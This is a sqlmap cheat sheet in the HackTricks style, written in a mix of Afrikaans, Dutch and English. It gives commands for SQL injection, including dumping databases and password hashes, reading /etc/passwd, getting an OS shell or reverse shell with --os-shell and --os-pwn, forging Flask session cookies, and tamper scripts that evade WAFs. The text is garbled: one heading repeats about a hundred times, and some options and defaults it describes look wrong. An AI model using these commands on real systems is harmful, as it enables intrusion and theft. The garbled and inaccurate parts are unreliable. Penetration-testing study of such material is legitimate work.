# SQLMap - Spiekbrief

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Onmiddellik beskikbare opset vir kwesbaarheidsassessering en penetrasietoetsing**. Voer 'n volledige pentest uit van enige plek met 20+ gereedskap en funksies wat strek van rekognisering tot verslagdoening. Ons vervang nie pentesters nie - ons ontwikkel aangepaste gereedskap, opsporings- en uitbuitingsmodules om hulle 'n bietjie tyd te gee om dieper te graaf, skulpe te kraak en pret te h√™.

{% embed url="https://pentest-tools.com/" %}

## Basiese argumente vir SQLmap

### Generies
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### Haal Inligting Op

#### Intern
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data

#### DB data
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Injeksie plek

### Vanaf Burp/ZAP vaslegging

Vasvang die versoek en skep 'n req.txt l√™er
```bash
sqlmap -r req.txt --current-user
```
### GET Aanvraag Injeksie

In 'GET' aanvraag injeksie, word 'n SQL-injeksie-aanval uitgevoer deur kwaadwillige SQL-kode in die URL-parameters van 'n GET-aanvraag in te sluit. Hierdie aanval maak gebruik van swakheid in die hantering van gebruikersinsette deur die toepassing en kan lei tot die uitvoering van ongewenste SQL-opdragte op die databasiserver.

Om 'n GET-aanvraag-injeksie-aanval uit te voer, kan jy die volgende stappe volg:

1. Identifiseer die URL-parameter wat vatbaar is vir injeksie.
2. Bou 'n kwaadwillige URL wat die SQL-injeksie-kode insluit.
3. Stuur die kwaadwillige URL na die toepassing deur dit in 'n webblaaier in te voer of deur 'n hulpmiddel soos cURL te gebruik.
4. Monitor die respons van die toepassing om te sien of daar enige tekens van 'n suksesvolle injeksie is, soos foutboodskappe of onverwagte resultate.
5. As die injeksie suksesvol was, kan jy verdere aanvalle uitvoer, soos die oproep van ander databasisfunksies of die verkryging van gevoelige inligting.

Dit is belangrik om te onthou dat die uitvoering van 'n SQL-injeksie-aanval sonder toestemming van die eienaar van die toepassing onwettig is en ernstige gevolge kan h√™. Dit moet slegs gedoen word as deel van 'n wettige pentestingsessie of met toestemming van die toepassingseienaar.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST Aanvraag Injeksie

In sommige gevallen kan SQL-injectie worden uitgevoerd via POST-aanvragen in plaats van GET-aanvragen. Dit kan voorkomen wanneer gevoelige gegevens, zoals gebruikersnamen en wachtwoorden, worden verzonden via een POST-verzoek naar de server.

Om SQL-injectie via POST-aanvragen uit te voeren, kan SQLMap worden gebruikt. SQLMap is een krachtige tool die specifiek is ontworpen voor het automatiseren van SQL-injectieaanvallen.

Om SQLMap te gebruiken voor POST-aanvraaginjectie, moet je de volgende stappen volgen:

1. Identificeer het doel-URL dat de POST-aanvraag verwerkt.
2. Verzamel de vereiste parameters en hun waarden die worden verzonden via de POST-aanvraag.
3. Gebruik de `--data` optie in SQLMap om de POST-aanvraaggegevens op te geven. Bijvoorbeeld: `--data "param1=value1&param2=value2"`.
4. Voer SQLMap uit met de juiste opties en parameters om de SQL-injectieaanval uit te voeren.

Het gebruik van SQLMap voor POST-aanvraaginjectie kan het proces van het identificeren en exploiteren van SQL-injectie kwetsbaarheden vereenvoudigen. Het is echter belangrijk om voorzichtig te zijn en alleen legitieme en ethische hackingactiviteiten uit te voeren met toestemming van de eigenaar van het doelsysteem.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Injeksies in Koppe en ander HTTP Metodes

SQLMap supports injection testing in various HTTP methods, including GET, POST, PUT, DELETE, and HEAD. It can also test for injections in headers such as `Referer`, `User-Agent`, `Cookie`, and `Authorization`.

To test for injections in headers, you can use the `--headers` option followed by the header name and the injection payload. For example:

```
sqlmap -u http://example.com/ --headers="Referer: <injection_payload>"
```

You can also test for injections in other HTTP methods by using the `--method` option followed by the desired method. For example:

```
sqlmap -u http://example.com/ --method=PUT --data="<injection_payload>"
```

Remember to properly encode the injection payload to ensure it is interpreted correctly by the server. SQLMap provides various encoding options that you can use, such as `--hex`, `--base64`, and `--urlencode`.

By testing for injections in headers and other HTTP methods, you can identify potential vulnerabilities in the application and exploit them to gain unauthorized access or extract sensitive information.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Dui aan string wanneer inspuiting suksesvol is

When performing SQL injection attacks, it is important to determine whether the injection was successful or not. One way to do this is by indicating a specific string that will be displayed if the injection is successful.

By default, SQLMap uses the string "injection" to indicate a successful injection. However, you can customize this string by using the `--string` option followed by the desired string.

For example, to indicate a successful injection with the string "success", you can use the following command:

```
sqlmap -u <target_url> --string="success"
```

Once the injection is successful, SQLMap will search for the specified string in the response and confirm the success of the injection.

Keep in mind that the chosen string should be unique and unlikely to appear in normal responses. This will help ensure accurate detection of successful injections.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** maak gebruik van `-e` of `--eval` om elke lading te verwerk voordat dit met 'n python oneliner gestuur word. Dit maak dit baie maklik en vinnig om die lading op aangepaste maniere te verwerk voordat dit gestuur word. In die volgende voorbeeld word die **flask koekie sessie** **deur flask onderteken met die bekende geheim voordat dit gestuur word**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Skulp

Hierdie gedeelte beskryf die gebruik van die `--os-shell` vlag in SQLMap. Hierdie vlag word gebruik om 'n interaktiewe skulp te verkry op die bediener waar die SQL-injeksie plaasvind.

#### Gebruik

Om die `--os-shell` vlag te gebruik, voer die volgende opdrag in:

```
sqlmap -u <target_url> --os-shell
```

Vervang `<target_url>` met die teiken-URL waarop jy SQLMap wil uitvoer.

#### Funksies

Die `--os-shell` vlag bied die volgende funksies:

- Gee toegang tot 'n interaktiewe skulp op die bediener.
- Maak dit moontlik om opdragte direk op die bediener uit te voer.
- Bied 'n omgewing waarin jy die bediener se l√™erstelsel kan ondersoek en manipuleer.

#### Opmerkings

- Die `--os-shell` vlag is slegs beskikbaar as SQLMap 'n suksesvolle SQL-injeksie vind.
- Wees versigtig wanneer jy opdragte uitvoer op die bediener, aangesien dit kan lei tot ongewenste gevolge of selfs wettige probleme.

#### Voorbeeld

Hier is 'n voorbeeld van hoe om die `--os-shell` vlag te gebruik:

```
sqlmap -u http://example.com/vuln.php?id=1 --os-shell
```

Hierdie opdrag sal SQLMap uitvoer teen die URL `http://example.com/vuln.php?id=1` en as 'n suksesvolle SQL-injeksie gevind word, sal dit 'n interaktiewe skulp op die bediener verkry.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Lees L√™er

Om 'n l√™er te lees deur middel van SQL-injeksie, kan jy die volgende stappe volg:

1. Identifiseer die kwetsbare parameter in die URL of vormveld.
2. Voer die SQL-injeksie-aanval uit deur die kwetsbare parameter te manipuleer.
3. Gebruik die `UNION SELECT`-verklaring om die inhoud van 'n l√™er te lees.
4. Identifiseer die pad na die teikenl√™er en die kolomnommers wat die inhoud van die l√™er bevat.
5. Voer die SQL-injeksie-aanval uit deur die `UNION SELECT`-verklaring te gebruik, waarin jy die pad na die teikenl√™er en die kolomnommers spesifiseer.
6. Analiseer die resultate van die aanval om die inhoud van die l√™er te verkry.

Hier is 'n voorbeeld van 'n SQL-injeksie-aanval om 'n l√™er te lees:

```
http://example.com/page.php?id=1 UNION SELECT 1,2,LOAD_FILE('/path/to/file'),4,5--
```

In hierdie voorbeeld word die `LOAD_FILE`-funksie gebruik om die inhoud van 'n l√™er te lees. Jy moet die pad na die teikenl√™er vervang met die korrekte pad op die bedoelde stelsel.

Onthou om hierdie tegniek slegs op 'n legitieme en wettige manier te gebruik, met toestemming van die eienaar van die stelsel wat jy aanval.
```bash
--file-read=/etc/passwd
```
### Kruip 'n webwerf met SQLmap en outomatiese uitbuiting

SQLmap is 'n kragtige hulpmiddel wat gebruik kan word om webwerwe te kruip en SQL-injeksie-aanvalle outomaties uit te buit. Hier is 'n stap-vir-stap handleiding oor hoe om SQLmap te gebruik om 'n webwerf te kruip en potensi√´le SQL-injeksiekwessies te identifiseer:

1. **Installeer SQLmap**: Begin deur SQLmap op jou stelsel te installeer. Jy kan dit doen deur die bronkode van die amptelike SQLmap-github-repo af te laai en dit te installeer, of deur die hulpmiddel te installeer met behulp van 'n pakkettebestuurder soos `apt` of `yum`.

2. **Identifiseer die teikenwebwerf**: Kies 'n webwerf wat jy wil kruip en uitbuit met SQLmap. Maak seker dat jy toestemming het om die webwerf te toets en dat jy nie enige wette oortree nie.

3. **Begin die kruipproses**: Voer die volgende opdrag in die opdragre√´l in om SQLmap te gebruik om die webwerf te kruip:

   ```
   sqlmap -u <target_url> --crawl=3
   ```

   Hier is 'n paar belangrike punte om in gedagte te hou:
   - Vervang `<target_url>` met die URL van die teikenwebwerf.
   - Die `--crawl=3`-opsie bepaal die diepte van die kruipproses. Jy kan dit aanpas volgens jou behoeftes.

4. **Identifiseer SQL-injeksiekwessies**: SQLmap sal die webwerf kruip en potensi√´le SQL-injeksiekwessies identifiseer. Dit sal die URL's van die kwessies aandui en 'n lys van moontlike injeksiepunte gee.

5. **Outomatiese uitbuiting**: Om SQLmap te gebruik om die SQL-injeksiekwessies outomaties uit te buit, voer die volgende opdrag in:

   ```
   sqlmap -u <target_url> --exploit
   ```

   Hier is 'n paar belangrike punte om in gedagte te hou:
   - Vervang `<target_url>` met die URL van die teikenwebwerf.
   - Die `--exploit`-opsie sal SQLmap toelaat om die SQL-injeksiekwessies outomaties uit te buit.

6. **Analiseer die resultate**: SQLmap sal die resultate van die uitbuiting aantoon en inligting verskaf oor die suksesvolle aanvalle. Analiseer hierdie resultate om te bepaal of die webwerf vatbaar is vir SQL-injeksie-aanvalle.

Dit is belangrik om te onthou dat jy slegs toestemming moet h√™ om SQLmap op 'n webwerf te gebruik en dat jy verantwoordelik moet wees vir enige aksies wat jy onderneem.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Tweede Orde Injeksie

'n Tweede orde injeksie is 'n tipe SQL-injeksie wat plaasvind wanneer die ingeslote SQL-kode nie onmiddellik uitgevoer word nie, maar eers later in die toepassing. Dit gebeur wanneer die ingeslote data in 'n databasis gestoor word en later gebruik word om 'n SQL-aanvraag te bou.

Hierdie tipe injeksie is moeiliker om te ontdek en uit te buit as 'n gewone SQL-injeksie, omdat die aanvaller moet wag vir die data om in die databasis gestoor te word en later gebruik te word. Dit kan egter baie gevaarlik wees, omdat dit die aanvaller in staat stel om die aanval uit te voer sonder om direkte toegang tot die databasis te h√™.

Om tweede orde injeksie te ontdek, kan jy gebruik maak van hulpmiddels soos SQLMap. Hierdie hulpmiddel kan die toepassing outomaties skandeer vir moontlike tweede orde injeksiepunte en dit help om die aanval uit te voer.

Dit is belangrik om tweede orde injeksie te verstaan en dit te beskerm teen hierdie tipe aanvalle deur behoorlike data-validasie en parameterisering van SQL-aanvrae te implementeer.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Lees hierdie pos**](second-order-injection-sqlmap.md)**oor hoe om eenvoudige en komplekse tweede-orde inspuitings met sqlmap uit te voer.**

## Aanpassing van Inspuiting

### Stel 'n agtervoegsel in
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Voorvoegsel
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Help om booleaanse inspuiting te vind

Boolean inspuiting is een techniek die wordt gebruikt om SQL-injectieaanvallen uit te voeren op een webtoepassing. Met deze techniek kunnen aanvallers de waarheidswaarde van een SQL-query manipuleren door gebruik te maken van booleaanse logica.

Om booleaanse inspuiting te vinden, kunt u de volgende stappen volgen:

1. Identificeer de invoervelden op de webtoepassing die mogelijk kwetsbaar zijn voor SQL-injectie.
2. Voer een reeks tests uit om te controleren of de invoervelden vatbaar zijn voor booleaanse inspuiting. U kunt bijvoorbeeld proberen om de waarheidswaarde van een SQL-query te veranderen door gebruik te maken van logische operatoren zoals AND, OR en NOT.
3. Analyseer de reacties van de webtoepassing om te bepalen of de SQL-query is uitgevoerd zoals verwacht. Als de reactie verschilt op basis van de waarheidswaarde van de query, kan dit duiden op een succesvolle booleaanse inspuiting.
4. Gebruik geautomatiseerde tools zoals SQLMap om het proces van het vinden van booleaanse inspuiting te versnellen. Deze tools kunnen verschillende technieken en payloads gebruiken om kwetsbaarheden te identificeren en te exploiteren.

Het is belangrijk op te merken dat booleaanse inspuiting een geavanceerde techniek is die een grondig begrip van SQL en webtoepassingen vereist. Het wordt sterk aanbevolen om deze techniek alleen toe te passen op systemen waarvoor u toestemming heeft om te testen, zoals tijdens een pentest.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Verander

Onthou dat **jy jou eie verander kan skep in Python** en dit is baie eenvoudig. Jy kan 'n verander voorbeeld vind op die [Bladsy vir Tweede Orde Injeksie hier](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Beskrywing                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Vervang die apostroofkarakter met sy UTF-8 volle breedte teenhanger                                                                |
| apostrophenullencode.py      | Vervang die apostroofkarakter met sy onwettige dubbele unicode teenhanger                                                          |
| appendnullbyte.py            | Voeg 'n gekodeerde NULL-byte karakter by die einde van die payload                                                                |
| base64encode.py              | Base64 alle karakters in 'n gegewe payload                                                                                        |
| between.py                   | Vervang die groter as operator ('>') met 'NIET TUSSEN 0 EN #'                                                                     |
| bluecoat.py                  | Vervang die spasiekarakter na SQL-stelling met 'n geldige lukrake le√´ karakter. Vervang daarna karakter = met LIKE operator       |
| chardoubleencode.py          | Verdubbel url-kodeer alle karakters in 'n gegewe payload (verwerk nie reeds gekodeer nie)                                         |
| commalesslimit.py            | Vervang gevalle soos 'LIMIT M, N' met 'LIMIT N OFFSET M'                                                                          |
| commalessmid.py              | Vervang gevalle soos 'MID(A, B, C)' met 'MID(A FROM B FOR C)'                                                                      |
| concat2concatws.py           | Vervang gevalle soos 'CONCAT(A, B)' met 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'                                                      |
| charencode.py                | Url-kodeer alle karakters in 'n gegewe payload (verwerk nie reeds gekodeer nie)                                                   |
| charunicodeencode.py         | Unicode-url-kodeer nie-gekodeerde karakters in 'n gegewe payload (verwerk nie reeds gekodeer nie). "%u0022"                         |
| charunicodeescape.py         | Unicode-url-kodeer nie-gekodeerde karakters in 'n gegewe payload (verwerk nie reeds gekodeer nie). "\u0022"                         |
| equaltolike.py               | Vervang alle voorkomste van die operator gelyk ('=') met die operator 'LIKE'                                                      |
| escapequotes.py              | Slas ontsnap aan aanhalingstekens (' en ")                                                                                         |
| greatest.py                  | Vervang die groter as operator ('>') met die teenhanger 'GREATEST'                                                                |
| halfversionedmorekeywords.py | Voeg 'n versie MySQL-kommentaar voor elke sleutelwoord by                                                                         |
| ifnull2ifisnull.py           | Vervang gevalle soos 'IFNULL(A, B)' met 'IF(ISNULL(A), B, A)'                                                                      |
| modsecurityversioned.py      | Sluit die volledige navraag in met 'n versiekommentaar                                                                             |
| modsecurityzeroversioned.py  | Sluit die volledige navraag in met 'n nul-versiekommentaar                                                                          |
| multiplespaces.py            | Voeg veelvuldige spasies by SQL-sleutelwoorde                                                                                      |
| nonrecursivereplacement.py   | Vervang voorafbepaalde SQL-sleutelwoorde met verteenwoordigings wat geskik is vir vervanging (bv. .replace("SELECT", "")) filters |
| percentage.py                | Voeg 'n persentasieteken ('%') voor elke karakter by                                                                               |
| overlongutf8.py              | Omskakel alle karakters in 'n gegewe payload (verwerk nie reeds gekodeer nie)                                                    |
| randomcase.py                | Vervang elke sleutelwoordkarakter met 'n lukrake gevalwaarde                                                                       |
| randomcomments.py            | Voeg lukrake kommentaar by SQL-sleutelwoorde                                                                                        |
| securesphere.py              | Voeg 'n spesiaal vervaardigde string by                                                                                             |
| sp\_password.py              | Voeg 'sp\_password' by die einde van die payload vir outomatiese verduistering vanaf DBMS-logboeke                                |
| space2comment.py             | Vervang spasiekarakter (' ') met kommentaar                                                                                        |
| space2dash.py                | Vervang spasiekarakter (' ') met 'n streepkommentaar ('--') gevolg deur 'n lukrake string en 'n nuwe lyn ('\n')                   |
| space2hash.py                | Vervang spasiekarakter (' ') met 'n pondkarakter ('#') gevolg deur 'n lukrake string en 'n nuwe lyn ('\n')                         |
| space2morehash.py            | Vervang spasiekarakter (' ') met 'n pondkarakter ('#') gevolg deur 'n lukrake string en 'n nuwe lyn ('\n')                         |
| space2mssqlblank.py          | Vervang spasiekarakter (' ') met 'n lukrake le√´ karakter uit 'n geldige stel alternatiewe karakters                               |
| space2mssqlhash.py           | Vervang spasiekarakter (' ') met 'n pondkarakter ('#') gevolg deur 'n nuwe lyn ('\n')                                              |
| space2mysqlblank.py          | Vervang spasiekarakter (' ') met 'n lukrake le√´ karakter uit 'n geldige stel alternatiewe karakters                               |
| space2mysqldash.py           | Vervang spasiekarakter (' ') met 'n streepkommentaar ('--') gevolg deur 'n nuwe lyn ('\n')                                         |
| space2plus.py                | Vervang spasiekarakter (' ') met plus ('+')                                                                                        |
| space2randomblank.py         | Vervang spasiekarakter (' ') met 'n lukrake le√´ karakter uit 'n geldige stel alternatiewe karakters                               |
| symboliclogical.py           | Vervang AND- en OR-logiese operatore met hul simboliese teenhangers (&& en                                                          |
| unionalltounion.py           | Vervang UNION ALL SELECT met UNION SELECT                                                                                          |
| unmagicquotes.py             | Vervang aanhalingstekenkarakter (') met 'n multi-byte kombinasie %bf%27 saam met 'n generiese kommentaar aan die einde (om dit te laat werk) |
| uppercase.py                 | Vervang elke sleutelwoordkarakter met 'n hoofletterwaarde 'INSERT'                                                                 |
| varnish.py                   | Voeg 'n HTTP-kop 'X-originating-IP' by                                                                                             |
| versionedkeywords.py         | Sluit elke nie-funksie sleutelwoord in met 'n versie MySQL-kommentaar                                                              |
| versionedmorekeywords.py     | Sluit elke sleutelwoord in met 'n versie MySQL-kommentaar                                                                           |
| xforwardedfor.py             | Voeg 'n vals HTTP-kop 'X-Forwarded-For' by                                                                                         |

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Onmiddellik beskikbare opstelling vir kwesbaarheidsassessering en penetrasietoetsing**. Voer 'n volledige pentest uit van enige plek met 20+ gereedskap en funksies wat strek van rekognisering tot verslagdoening. Ons vervang nie pentesters nie - ons ontwikkel aangepaste gereedskap, opsporings- en uitbuitingsmodules om hulle 'n bietjie tyd te gee om dieper te graaf, doppe te kraak en pret te h√™.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
